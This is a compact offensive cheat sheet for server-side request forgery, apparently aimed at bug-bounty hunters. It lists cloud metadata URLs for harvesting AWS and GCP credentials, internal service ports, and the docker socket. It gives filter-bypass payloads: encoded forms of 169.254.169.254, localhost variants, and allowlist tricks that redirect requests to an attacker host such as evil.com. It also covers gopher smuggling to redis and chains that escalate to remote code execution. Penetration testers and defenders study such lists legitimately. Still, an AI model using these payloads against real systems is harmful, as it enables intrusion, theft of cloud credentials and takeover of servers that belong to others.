## SSRF — Server-Side Request Forgery
Where: url/import/webhook/preview/pdf-render/image-fetch params; anything that fetches a URL server-side.
Detect: point the param at a collaborator/OOB host or `http://127.0.0.1:PORT`; watch for the fetch.
High-value targets: cloud metadata `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS creds), GCP `http://metadata.google.internal/computeMetadata/v1/` (needs header `Metadata-Flavor: Google`), localhost admin (grafana/jenkins/k8s `:8080/:9090/:3000/:8443`), docker `/var/run/docker.sock`.
Filter/allowlist bypass:
- Alt IP encodings for 169.254.169.254: decimal `2852039166`, hex `0xA9FEA9FE`, octal `0251.0376.0251.0376`, mixed `169.254.169.254` variants, `[::ffff:169.254.169.254]`.
- `http://localhost` blocked -> `http://127.0.0.1`, `http://0.0.0.0`, `http://0`, `http://127.1`, `http://2130706433` (decimal), `http://[::1]`.
- Domain allowlist -> `http://allowed.com@evil.com`, `http://evil.com#allowed.com`, `http://evil.com?allowed.com`, DNS rebinding, open-redirect on an allowed host.
- Scheme -> `file://`, `gopher://` (smuggle raw TCP: redis/smtp/fastcgi), `dict://`.
Escalate: SSRF -> metadata -> temp creds -> cloud API; SSRF -> internal service RCE; gopher -> redis RCE. SSRF->metadata->RCE is the top-paid chain.
